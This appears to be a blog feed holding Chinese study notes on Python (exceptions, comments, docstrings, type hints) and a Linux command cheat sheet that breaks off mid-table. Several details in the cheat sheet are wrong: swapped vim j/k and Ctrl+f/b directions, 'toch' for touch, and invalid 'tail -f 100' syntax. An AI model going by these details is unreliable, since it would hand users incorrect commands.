Hoare为他在1965年发明了<code>null</code>引用（跟Python中的<code>None</code>值类似）而道歉。他说：“我把<code>null</code>引用称为自己的十亿美元错误……我没能抵制诱惑，加入了<code>null</code>引用，仅仅是因为它实现起来非常容易。但是，它导致了无数的错误、漏洞和系统崩溃，可能在之后的40年中造成了十亿美元的损失。”</p><h2 id="10-6-抛出异常和返回错误码"><a href="#10-6-抛出异常和返回错误码" class="headerlink" title="10.6　抛出异常和返回错误码"></a>10.6　抛出异常和返回错误码</h2><p>　　在Python中，“异常”和“错误”这两个词的含义相差无几，都是指程序中的异常情况，表明程序存在问题。在20世纪八九十年代，随着C++和Java的出现，“异常”成为流行的编程语言特性，它们取代了错误码。错误码是从函数中返回的值，说明代码有问题。使用“异常”一词的好处是，函数返回值只与函数的目的有关，而不必同时用来表明存在错误。</p><p>　　错误码有时也会导致程序问题。比如，Python的<code>find()</code>通常会返回子串的索引，在找不到时则返回<code>-1</code>作为错误码。但<code>-1</code>也可以用来表示字符串末尾的索引，无意中使用<code>-1</code>作为错误码可能会引发错误。在交互式shell中输入以下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt;&gt;&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Letters after b in &quot;Albert&quot;:&#x27;</span>, <span class="hljs-string">&#x27;Albert&#x27;</span>[<span class="hljs-string">&#x27;Albert&#x27;</span>.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;b&#x27;</span>) + 1:])<br>Letters after b <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;Albert&quot;</span>: ert<br>&gt;&gt;&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Letters after x in &quot;Albert&quot;:&#x27;</span>, <span class="hljs-string">&#x27;Albert&#x27;</span>[<span class="hljs-string">&#x27;Albert&#x27;</span>.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;x&#x27;</span>) + 1:])<br>Letters after x <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;Albert&quot;</span>: Albert<br></code></pre></td></tr></table></figure><p>代码中的<code>Albert&#39;.find(&#39;x&#39;)</code>被计算为错误码<code>-1</code>，这导致表达式<code>&#39;Albert&#39;[&#39;Albert&#39;.find(&#39;x&#39;) + 1:]</code>被推导为<code>&#39;Albert&#39;[-1 + 1: ]</code>，接着推导为<code>Albert&#39;[0:]</code>，最终等于<code>Albert</code>。很显然，这并不符合预期。调用<code>index()</code>而非<code>find()</code>，就像<code>&#39;Albert&#39;[&#39;Albert&#39;.index(&#39;x&#39;) + 1:]</code>这样，会导致异常，使不可忽略的问题暴露出来。</p><p>　　字符串的<code>index()</code>方法在找不到子串时会抛出<code>ValueError</code>异常。如果不处理这个异常，程序就会崩溃，所以最好不要忽略错误。</p><p>　　当异常表示一个实际错误时，异常类的名称往往以Error结尾，比如<code>ValueError</code>、<code>NameError</code>或<code>SyntaxError</code>。表示在特殊情况下不一定是错误的异常类有<code>StopIteration</code>、<code>KeyboardInterrupt</code>和<code>SystemExit</code>。</p><h1 id="十一-注释、文档字符串和类型提示"><a href="#十一-注释、文档字符串和类型提示" class="headerlink" title="十一　注释、文档字符串和类型提示"></a>十一　注释、文档字符串和类型提示</h1><blockquote><p>代码的注释与文档的重要性不亚于代码本身，因为软件永远不会彻底完成，你总是需要修改，要么添加新功能，要么修复错误。如果你对代码不够了解，就无法进行修改，所以代码的可读性很重要。正如计算机科学家Harold Abelson、Gerald Jay Sussman和Julie Sussman曾写的那样：“代码是用来让人读的，只是顺便让机器执行而已。”</p></blockquote><p>　　<strong>注释</strong>、<strong>文档字符串</strong>和<strong>类型提示****1</strong>有助于维护代码的可读性。<strong>注释</strong>是写在代码中、会被计算机忽略的简短解释。注释的作用是为除编写者之外的人提供有价值的说明、警告和提醒，有时候甚至会对写这段代码的人起到同样的作用。几乎每个程序员都曾暗自吐槽：“到底是谁写的这堆乱七八糟的东西？”结果发现答案竟然是“自己”。</p><h2 id="11-1-注释"><a href="#11-1-注释" class="headerlink" title="11.1　注释"></a>11.1　注释</h2><p>和大多数编程语言一样，Python支持单行注释和多行注释。以<code>#</code>开始，直到行尾的所有文本都是单行注释。尽管Python没有专门的多行注释语法，但使用三引号的多行字符串可以用于多行注释。毕竟，一个字符串值不会导致Python解释器做任何事情。</p><h3 id="11-1-1-注释风格"><a href="#11-1-1-注释风格" class="headerlink" title="11.1.1　注释风格"></a>11.1.1　注释风格</h3><p>来看看一些遵循了优秀注释风格的实践：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 这是对下面一行代码的注释： ❶</span><br>someCode()<br><br><span class="hljs-comment"># 这是一个更长的块注释，它分散在多行，并使用 ❷</span><br><span class="hljs-comment"># 多个单行注释</span><br><span class="hljs-comment"># ❸</span><br><span class="hljs-comment"># 它们被称为块注释</span><br><br><span class="hljs-keyword">if</span> someCondition:<br>   <span class="hljs-comment"># 这是关于其他代码的注释： ❹</span><br>   someOtherCode() <span class="hljs-comment"># 这是一个单行注释 ❺</span><br></code></pre></td></tr></table></figure><p>　　注释通常应该独立成行，而不是放在代码行的末尾。多数情况下，它们应该是大小写正确且带有标点符号的完整句子，而非短语或者单词❶，除非受限于代码行长的限制。多行的注释❷可以连续使用多个单行注释，也叫作块注释。空白单行注释可以用于划分块注释中的段落❸。注释的缩进水平应该跟被注释的代码一致❹。跟在代码行内的注释被称为“内联注释”❺，这种情况下，代码和注释之间应该至少保留两个空格。</p><h3 id="11-1-2-内联注释"><a href="#11-1-2-内联注释" class="headerlink" title="11.1.2　内联注释"></a>11.1.2　内联注释</h3><p>内联注释的一个常见且适宜的用途是解释变量的作用，或为其提供其他背景信息。这些内联注释写在创建变量的赋值语句后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">month = <span class="hljs-number">2</span> <span class="hljs-comment"># 月份的取值范围从0（1月）到11（12月）</span><br>catWeight = <span class="hljs-number">4.9</span> <span class="hljs-comment"># 重量的单位是千克</span><br>website = <span class="hljs-string">&#x27;ituring.cn&#x27;</span> <span class="hljs-comment"># 字符串不要以&quot;https://&quot;开头</span><br></code></pre></td></tr></table></figure><p>　　除非是通过类型提示的形式，否则内联注释不应该指定变量的数据类型，因为显然可以从赋值语句中得知这一点，11.3.4节也将有相关描述。</p><h3 id="11-1-3-说明性的注释"><a href="#11-1-3-说明性的注释" class="headerlink" title="11.1.3　说明性的注释"></a>11.1.3　说明性的注释</h3><p>一般来说，注释应该解释为什么代码要这样写，而不是解释代码做了什么或怎么做的。即使满足了良好的代码风格和第3、4章提及的有用的命名约束，代码也不能很好地解释最初编写者的意图。即使是你自己写的代码，几周后也可能忘记其中的细节。你应该写翔实的代码注释，而不是让以后的你“骂”过去的自己。</p><p>　　比如，这里有一个没意义的注释，它解释了代码做了什么（这是显而易见的），但并没有说明代码的动机：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>currentWeekWages *= <span class="hljs-number">1.5</span> <span class="hljs-comment"># 将currentWeekWages乘以1.5</span><br></code></pre></td></tr></table></figure><p>　　这条注释还不如没有。从代码中就能看出变量<code>currentWeekWages</code>被乘以1.5，直接删除这行注释会让代码更简洁。下面的注释要好得多：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>currentWeekWages *= <span class="hljs-number">1.5</span> <span class="hljs-comment"># 是工资的1.5倍</span><br></code></pre></td></tr></table></figure><p>　　这行注释解释了代码背后的意图，而不是重述代码要做什么。无论代码写得多好，也无法提供这样的背景信息。</p><h3 id="11-1-4-总结性的注释"><a href="#11-1-4-总结性的注释" class="headerlink" title="11.1.4　总结性的注释"></a>11.1.4　总结性的注释</h3><p>　　注释不仅仅可以用于说明程序员的意图，使用简短的注释总结多行代码还可以使阅读者不看代码就能对它的作用有大概的认识。程序员经常用空行划分代码的“段落”，而总结性的注释通常在这些段落的起始行。不同于解释单行代码的单行注释，总结性注释在更高的抽象层次上起到解释代码的作用。</p><p>　　比如，通过阅读以下4行代码，可以得知它们将<code>playerTurn</code>变量设置为代表对面玩家的值。简洁的注释可以使读者不必阅读和推敲代码就能理解代码的目的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 轮到对手：</span><br><span class="hljs-keyword">if</span> playerTurn == PLAYER_X:<br>    playerTurn = PLAYER_O<br><span class="hljs-keyword">elif</span> playerTurn == PLAYER_O:<br>    playerTurn = PLAYER_X<br></code></pre></td></tr></table></figure><p>　　在代码中放置这些总结性注释可以增强代码的可读性。程序员可以借由它们跳到感兴趣的地方做深入了解。总结性注释也可以防止程序员对代码的作用产生误解。一个简洁的总结性注释可以确保开发人员正确理解代码的工作原理。</p><h3 id="11-1-5-“经验之谈”的注释"><a href="#11-1-5-“经验之谈”的注释" class="headerlink" title="11.1.5　“经验之谈”的注释"></a>11.1.5　“经验之谈”的注释</h3><p>　　之前在软件公司工作时，我有一次被要求适配一个图形库，使其支持包含数百万数据点的图表实时更新。我们当时使用的库可以实时更新图表，也可以支持有数百万数据点的图表，但不能同时做到两者。一开始，我以为用几天时间就能完成这项任务。但是到了第3周，我仍然感觉还要过几天才能完成。每天，我都觉得解决方案已经近在眼前了，但直到第5周，我才弄出了一个能用得上的原型。</p><p>　　在整个过程中，我了解了大量的图形库工作原理、其能力及限制。我花了几小时把这些细节写成了一整页的注释，并把它放在了代码中。我知道任何一个对代码进行后续修改的人都会像我一样，遇到看似简单实际上棘手的问题，而我写的这份文档将节省他们数周的工作量。</p><p>　　我将此类注释称为“经验之谈”的注释，它们可能长达几段，以至于在代码文件中看起来很突兀。但它们包含的信息对于任何需要维护这些代码的人而言都是宝藏。不要害怕在代码文件中写大段的用于解释某些工作原理的详细注释。对于程序员而言，很多细节是未知的，可能被误解或者被忽略。如果开发人员不需要这些注释，那跳过它们就好，而需要它们的开发人员会谢天谢地。请记住，“经验之谈”的注释跟上面两类注释不一样，它不同于模块或者函数文档（这是文档字符串要做的），它也不是针对软件用户的教程或操作指南，而是提供给开发人员的。</p><p>　　我的“经验之谈”注释与开源图形库有关，可能会对其他人有帮助，所以我花了些时间将其整理为一条答案发布到公共问答网站上了，以便有类似问题的人可以找到。</p><h3 id="11-1-8-代码标签和TODO注释"><a href="#11-1-8-代码标签和TODO注释" class="headerlink" title="11.1.8　代码标签和TODO注释"></a>11.1.8　代码标签和TODO注释</h3><p>　　程序员有时候会留下简短的注释，提醒自己还有哪些工作要做，通常是以代码标签的形式：以全大写字母标签开头，后面是简短描述的注释。理想情况下，你会使用项目管理工具来追踪这类问题，而不只是写在代码中。但对于没有使用这些工具的小型个人项目而言，少量的TODO注释可以起到提醒的作用。请看下面这个示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">_chargeIonFluxStream() <span class="hljs-comment"># TODO：排查为什么每周二都会失败</span><br></code></pre></td></tr></table></figure><p>　　可以使用以下标签以起到不同类型的提醒作用。</p><blockquote><p>　　TODO：提示需要完成的工作。</p><p>　　FIXME：提示这部分代码还不能正常工作。</p><p>　　HACK：提示这部分代码可以工作，但可能有些勉强，需要做出改进。</p><p>　　XXX：通常用于提示高度严重的问题。</p></blockquote><p>　　你应该在这些总是大写的标签后加上对手头任务或问题更加具体的描述。稍后，可以在源代码中搜索这些标签，找到需要修正的代码。缺点是它们很容易被遗忘，除非你正好在阅读它们所处的代码段落。代码标签不应该取代正式的问题跟踪工具或者错误报告工具。如果你确实想在代码中使用代码标签，我建议把这个工作处理得简单一些：只使用TODO，放弃别的标签。</p><h2 id="11-2-文档字符串"><a href="#11-2-文档字符串" class="headerlink" title="11.2　文档字符串"></a>11.2　文档字符串</h2><p>　　<strong>文档字符串</strong>是出现在模块的.py源代码文件顶部或者在类或<code>def</code>语句之后的多行注释。它们提供关于被定义的模块、类、函数或方法的文档。自动文档生成工具可以使用这些文档字符串生成外部文档，比如帮助文档或网页。</p><p>　文档字符串必须使用三引号的多行注释，不能使用以<code>#</code>开头的单行注释。文档字符串应该始终使用3个双引号，而非3个单引号进行包裹。例如，这里是流行的<code>requests</code>模块中session.py文件的一部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*- ❶</span><br><br><span class="hljs-string">&quot;&quot;&quot; ❷</span><br><span class="hljs-string">requests.session</span><br><span class="hljs-string">~~~~~~~~~~~~~~~~</span><br><span class="hljs-string"></span><br><span class="hljs-string">This module provides a Session object to manage and persist settings across requests (cookies, auth,</span><br><span class="hljs-string">proxies).</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br>--snip—<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Session</span>(<span class="hljs-title class_ inherited__">SessionRedirectMixin</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;A Requests session. ❸</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Provides cookie persistence, connection-pooling, and configuration.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Basic Usage::</span><br><span class="hljs-string"></span><br><span class="hljs-string">      &gt;&gt;&gt; import requests</span><br><span class="hljs-string">      &gt;&gt;&gt; s = requests.Session()</span><br><span class="hljs-string">      &gt;&gt;&gt; s.get(&#x27;https://httpbin.org/get&#x27;)</span><br><span class="hljs-string">      &lt;Response [200]&gt;</span><br><span class="hljs-string">--snip--</span><br><span class="hljs-string"></span><br><span class="hljs-string">    def get(self, url, **kwargs):</span><br><span class="hljs-string">        r&quot;&quot;&quot;</span>Sends a GET request. Returns :<span class="hljs-keyword">class</span>:`Response` <span class="hljs-built_in">object</span>. ❹<br><br>        :param url: URL <span class="hljs-keyword">for</span> the new :<span class="hljs-keyword">class</span>:`Request` <span class="hljs-built_in">object</span>.<br>        :param \*\*kwargs: <span class="hljs-type">Optional</span> arguments that request takes.<br>        :rtype: requests.Response<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">--snip--</span><br></code></pre></td></tr></table></figure><p>　　session.py文件包括该模块本身的文档字符串❷、<code>Session</code>类❸及其<code>get()</code>方法❹的文档字符串。注意，尽管模块的文档字符串应该是模块中出现的第一个字符串，但还是应该跟在神奇的注释之后，比如shebang行或者编码定义行❶。</p><p>一般而言，文档字符串应该包含一个用于概述模块、类或者函数的行，后面有一个空行，空行后再提供更详细的信息。对于函数和方法，可以包含关于参数、返回值、副作用的信息。我们编写的文档说明不是给软件的使用者看的，而是给程序员看的。因此，它们应该包含技术信息，而非使用教程。</p><p>　　文档字符串的另一个重要优点是它们将文档集成到了源代码中。分开编写文档和代码时，很容易直接忘记编写文档这回事。但由于文档字符串被放置在模块、类和函数的顶部，因此这些信息很容易被注意到，也方便更新。</p><p>　　当代码还未写完时，你不一定能写出用来描述它的文档字符串。这种情况下，可以在文档字符串中加入一个TODO注释，提醒之后填补剩余的细节。比如，下面这个虚构的<code>reverseCatPolarity()</code>函数有一个不太好的文档字符串，它呈现了显而易见的事：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseCatPolarity</span>(<span class="hljs-params">catId, catQuantumPhase, catVoltage</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Reverses the polarity of a cat.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    TODO Finish this docstring.&quot;&quot;&quot;</span><br>--snip--<br></code></pre></td></tr></table></figure><p>　　由于每个类、函数和方法都要求有文档字符串，因此你可能想尽可能少写文档，先推进整体工作进度。如果没有TODO注释，很容易忘记需要后期重写这个文档字符串。</p><p>　　PEP 257包含了更多关于文档字符串的说明，可以在Python官网上查阅。</p><h2 id="11-3-类型提示"><a href="#11-3-类型提示" class="headerlink" title="11.3　类型提示"></a>11.3　类型提示</h2><p>　　许多编程语言是<strong>静态类型</strong>，也就是说，程序员必须在代码中声明所有变量、参数、返回值的数据类型。它的作用是允许解释器或编译器在程序运行前检查代码是否正确使用了所有对象。Python是<strong>动态类型</strong>：变量、参数和返回值可以是任何数据类型，甚至可以在程序运行时改变数据类型。动态语言通常更容易编程，因为它们不需要遵循很多限制，但动态语言缺乏静态语言所具有的避免运行时错误的优势。比如，写了一行Python代码<code>round(&#39;42&#39;)</code>，你可能没注意到把字符串传递给了只接受<code>int</code>参数或<code>float</code>参数的函数，直到运行代码出错时才意识到这一点。当你赋了错误类型的值，或传递了错误类型的参数时，静态类型的语言会在运行前发出警告。</p><p>　　Python通过<strong>类型提示</strong>提供了可选的静态类型支持。在下面的示例中，类型提示用粗体标注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">describeNumber</span>(<span class="hljs-params">number: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">if</span> number % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;An odd number. &#x27;</span><br>    <span class="hljs-keyword">elif</span> number == <span class="hljs-number">42</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The answer. &#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Yes, that is a number. &#x27;</span><br><br>myLuckyNumber: <span class="hljs-built_in">int</span> = <span class="hljs-number">42</span><br><span class="hljs-built_in">print</span>(describeNumber(myLuckyNumber))<br></code></pre></td></tr></table></figure><p>　　正如你看到的，类型提示使用冒号来分隔参数和变量的名称与类型。对于返回值，类型提示使用箭头（<code>-&gt;</code>）分隔<code>def</code>语句的闭合括号和类型。<code>describeNumber()</code>的类型提示显示它的<code>number</code>参数需要整数值，返回值是字符串。</p><p>　　不必为程序中的每一条数据都加上类型提示。可以采用渐进式类型化方法，只对某些变量、参数和返回值设置类型提示，这是动态类型的灵活性和静态类型的安全性之间的一个折中。但程序中的类型提示越多，静态代码分析工具就能有更多的信息发现程序中的潜在错误。</p><p>　　注意在前面的例子中，指定类型的名称与<code>int()</code>和<code>str()</code>构造函数的名称一致。在Python中，类、类型和数据类型的含义相同。对于任何由类构成的实例，都应该使用类的名称作为类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br>noon: datetime.time = datetime.time(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) ❶<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CatTail</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, length: <span class="hljs-built_in">int</span>, color: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.length = length<br>        self.color = color<br><br>zophieTail: CatTail = CatTail(<span class="hljs-number">29</span>, <span class="hljs-string">&#x27;grey&#x27;</span>) ❷<br></code></pre></td></tr></table></figure><p>　　<code>noon</code>变量的类型提示是<code>datetime.time</code>❶，因为它是一个时间对象（在<code>datetime</code>模块中定义）。同样，<code>zophieTail</code>对象的类型提示是<code>CatTail</code>❷，因为它是我们用类语句创建的<code>CatTail</code>类的一个对象。类型提示适用于指定类型的所有子类。例如，一个具有类型提示<code>dict</code>的变量可以被设置为任何字典类型的值，也可以被设置为<code>collections.OrderedDict</code>类型或者<code>collections.defaultdict</code>类型的值，因为这些类是<code>dict</code>的子类。</p><h3 id="11-3-2-为多种类型设置类型提示"><a href="#11-3-2-为多种类型设置类型提示" class="headerlink" title="11.3.2　为多种类型设置类型提示"></a>11.3.2　为多种类型设置类型提示</h3><p>　　Python的变量、参数和返回值可以有多种可能的数据类型。对于这种情况，可以从内置的<code>typing</code>模块导入<code>Union</code>以指定多类型的类型提示。在<code>Union</code>类名称后面的中括号内指定类型范围：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span><br>spam: <span class="hljs-type">Union</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">str</span>, <span class="hljs-built_in">float</span>] = <span class="hljs-number">42</span><br>spam = <span class="hljs-string">&#x27;hello&#x27;</span><br>spam = <span class="hljs-number">3.14</span><br></code></pre></td></tr></table></figure><p>　　在这个示例中，类型提示<code>Union[int, str, float]</code>指定<code>spam</code>可以被设置为整数、字符串或浮点数。注意，最好使用<code>from typing import *X*</code>的形式，而非<code>import typing</code>的形式，这样在进行类型提示时就不必到处写成冗长的<code>typing.*X*</code>。</p><p>　　在指定变量或返回值有多种数据类型时，如果想在除普通类型之外还包括<code>NoneType</code>，也就是<code>None</code>值的类型，需要在中括号内添加<code>None</code>，而非<code>NoneType</code>。（从技术上讲，<code>NoneType</code>与<code>int</code>或<code>str</code>不同，它不是内置标识符。）</p><p>　　更好的方式是从<code>typing</code>模块中引入<code>Optional</code>，使用<code>Optional[str]</code>的写法替代<code>Union[str, None]</code>。这种类型提示意味着函数或方法除了返回预期类型的值，还可以返回<code>None</code>。这里有一个示例：</p><p><code>typing</code>模块对于每种容器类型都有单独的类型别名。以下列出了Python中常见的容器类型的类型别名：</p><ul><li><code>List</code>指列表（<code>list</code>）数据类型；</li><li><code>Tuple</code>指元组（<code>tuple</code>）数据类型；</li><li><code>Dict</code>指字典（<code>dict</code>）数据类型；</li><li><code>Set</code>指集合（<code>set</code>）数据类型；</li><li><code>FrozenSet</code>指不可变集合（<code>frozenset</code>）数据类型；</li><li><code>Sequence</code>指列表、元组或任何其他序列数据类型；</li><li><code>Mapping</code>指字典、集合、不可变集合或者任何其他映射数据类型；</li><li><code>ByteString</code>指<code>bytes</code>、<code>bytearray</code>和<code>memoryview</code>类型。</li></ul><p>　　你可以在Python官网上找到这些类型的完整列表。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【linux】Linux常用命令</title>
    <link href="/2024/01/09/907Linux%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
    <url>/2024/01/09/907Linux%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="一-关机"><a href="#一-关机" class="headerlink" title="一 关机"></a>一 关机</h1><h2 id="1-1-关机重启相关操作命令"><a href="#1-1-关机重启相关操作命令" class="headerlink" title="1.1 关机重启相关操作命令"></a>1.1 关机重启相关操作命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">shutdown -h now<br>shutdown -h 5<br>poweroff <br><span class="hljs-meta prompt_"># </span><span class="language-bash">重启</span><br>shutdown -r now <br>shutdown -r 5<br>reboot <br></code></pre></td></tr></table></figure><h1 id="二-目录操作命令"><a href="#二-目录操作命令" class="headerlink" title="二 目录操作命令"></a>二 目录操作命令</h1><h2 id="2-1-增删改查"><a href="#2-1-增删改查" class="headerlink" title="2.1 增删改查"></a>2.1 增删改查</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd  # 进入<br>ls # 查看<br>mkdir # 增 创建<br>rm -rf # 删除<br>mv [选项] [源文件路径][目标文件路径]#源目录 #新目录  #还有重命名 移动功能<br>cp [选项] [源文件路径][目标文件路径] #源文件 #目标目录文件<br>scp [选项] [源文件路径][目标文件路径]<br>scp user@remote:/path/on/remote /path/to/local/directory # 远程到本地 加-r是递归<br>scp /path/to/local/file user@remote:/path/on/remote  # 从本地复制文件到远程主机：<br>find [目录] [参数] [文件名称]<br>find /usr/tmp -name &#x27;a*&#x27;    查找/usr/tmp目录下的所有以a开头的目录或文件<br></code></pre></td></tr></table></figure><h1 id="三-文件操作命令"><a href="#三-文件操作命令" class="headerlink" title="三 文件操作命令"></a>三 文件操作命令</h1><h2 id="3-1-增删改查"><a href="#3-1-增删改查" class="headerlink" title="3.1 增删改查"></a>3.1 增删改查</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">toch 文件名 # 创建，不过一般用vim创建<br>rm -rf [文件名] # 删<br>vim 改<br></code></pre></td></tr></table></figure><h2 id="3-1-2-vim"><a href="#3-1-2-vim" class="headerlink" title="3.1.2 vim"></a>3.1.2 vim</h2><ul><li><p>模式：</p></li><li><p>命令模式（command mode ）：命令模式就是最开始啥都不按的模式，光标移动，查看文件的</p><ul><li>可以控制屏幕光标的移动，字符、字或者行的查找删除和移动 也可以在指定光标下进入插入模式</li><li><strong>控制光标移动：↑，↓，</strong><ul><li><strong>h 左j 上k 下l 右</strong></li><li><strong>Ctrl + f上翻页Ctrl + b下翻页 Ctrl + u&#96;上翻半页Ctrl + d下翻半页</strong></li></ul></li><li><strong>改：按 i 进入插入模式 改也是一个意思</strong></li><li><strong>删除： 按dd 删除当前行，dd dG是清空所有</strong></li><li><strong>复制：按yy复制当前行</strong></li><li><strong>粘贴：按pp 粘贴刚刚复制的文本</strong></li><li><strong>撤销：按uu撤销上一步</strong></li></ul></li><li><p><strong>插入模式（insert mode）</strong>：</p><ul><li>i  ：在光标字符前开始插入</li><li><strong>a ：在光标字符后开始插入</strong></li><li><strong>o ： 在光标所在的行下面</strong></li></ul></li><li><p>底行模式： 冒号q和wq和！</p></li><li><p>如果要匹配（搜索）对应的文本，用<code>/</code></p><ul><li>比如说<code>/con</code></li><li>按回车进入文，按n 查找下一个，按Shift+n进入上一个</li></ul></li><li><p>进入命令模式：按下 <code>Esc</code> 键确保处于正常模式（Normal mode）。</p></li><li><p>输入以下命令之一来切换行号显示：</p><ul><li>显示绝对行号：输入 <code>:set number</code> 并按下 Enter 键。</li><li>显示相对行号：输入 <code>:set relativenumber</code> 并按下 Enter 键。</li></ul></li></ul><h2 id="3-1-3-文件查看"><a href="#3-1-3-文件查看" class="headerlink" title="3.1.3 文件查看"></a>3.1.3 文件查看</h2><ul><li><p>cat 直接看</p></li><li><p>more ：会显示百分比。跟vim的命令模式差不多，可以Ctrl +f b u d 翻页 </p><ul><li><strong>也可以回车空格向下翻【这个好用】</strong></li></ul></li><li><p>less：未找到命令，要安装的，先不学</p></li><li><p>taill ： 指定行数或者动态查看 </p><ul><li>一般看日志用的，tail -f 100 [文件名]</li></ul></li></ul><h2 id="3-2-权限的解读跟修改及用户管理"><a href="#3-2-权限的解读跟修改及用户管理" class="headerlink" title="3.2 权限的解读跟修改及用户管理"></a>3.2 权限的解读跟修改及用户管理</h2><p>查看详情：ll或者 ls -l</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 